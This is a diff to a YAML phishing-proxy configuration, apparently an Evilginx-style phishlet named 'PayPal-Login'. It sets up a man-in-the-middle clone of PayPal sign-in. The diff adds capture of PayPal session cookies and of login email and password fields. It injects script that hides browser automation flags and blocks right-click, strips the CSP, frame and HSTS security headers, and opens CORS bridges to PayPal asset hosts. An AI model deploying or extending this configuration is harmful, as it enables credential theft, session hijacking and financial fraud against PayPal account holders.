@@ -1,21 +1,44 @@
 name: "PayPal-Login"
-author: "Vanta v5"
+author: "Vanta v5 Red Team"
 min_ver: "5.0.0"
 proxy_hosts:
   - subdomain: "paypal"
     target: "www.paypal.com"
-auth_urls: ["/signin"]
-landing_path: ["/signin"]
+  - subdomain: "objects"
+    target: "www.paypalobjects.com"
+  - subdomain: "t"
+    target: "t.paypal.com"
+auth_urls: 
+  - "/signin"
+  - "/auth/signin"
+landing_path: 
+  - "/signin"
 auth_tokens:
   - {type: "cookie", name: "x-pp-s"}
   - {type: "cookie", name: "nsid"}
+  - {type: "cookie", name: "ts"}
+  - {type: "cookie", name: "X-PP-SILOVER"}
+  - {type: "cookie", name: "X-PP-L7"}
+  - {type: "cookie", name: "enforce_policy"}
 credentials:
   - {type: "post_param", name: "login_email", regex: null}
   - {type: "post_param", name: "login_password", regex: null}
-injections: []
+  - {type: "json_field", name: "login_email", regex: null}
+  - {type: "json_field", name: "login_password", regex: null}
+injections:
+  - trigger_path: "/signin"
+    position: "body_end"
+    content: |
+      (function(){
+        // PayPal Anti-Bot Evasion
+        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+        // Disable right-click for security
+        document.addEventListener('contextmenu', event => event.preventDefault());
+      })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "Strict-Transport-Security"}
 path_rewrites:
   - {pattern: "^/$", replace: "/signin", methods: ["GET"]}
 cookie_rewrites: []
@@ -23,3 +46,6 @@ blocklist:
   - {pattern: "analytics|/tagmanager/|/logger", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"signin\"], form[action*=\"login\"]", action_to: "/session"}
+bridges:
+  - {prefix: "/_objects/", target_host: "www.paypalobjects.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_t/", target_host: "t.paypal.com", strip_prefix: true, cors: "allow_all"}
